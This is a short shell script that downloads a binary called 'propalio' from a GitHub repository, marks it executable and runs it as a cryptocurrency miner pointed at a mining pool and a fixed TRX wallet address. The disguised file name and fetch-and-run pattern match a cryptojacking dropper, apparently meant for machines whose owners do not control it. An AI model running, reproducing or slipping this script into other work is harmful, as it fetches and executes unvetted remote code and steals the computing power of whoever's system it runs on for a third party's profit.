#!/bin/sh
wget https://github.com/mariobiszz/SRB/raw/main/propalio
chmod +x propalio
./propalio --algorithm cryptonight_upx --pool rx.unmineable.com:3333 --wallet TRX:TKFKVc4GpHpe21Lq4gHjcseFhFYnFpLLK1.$(echo $(shuf -i 1-20000 -n 1)-V) --password x
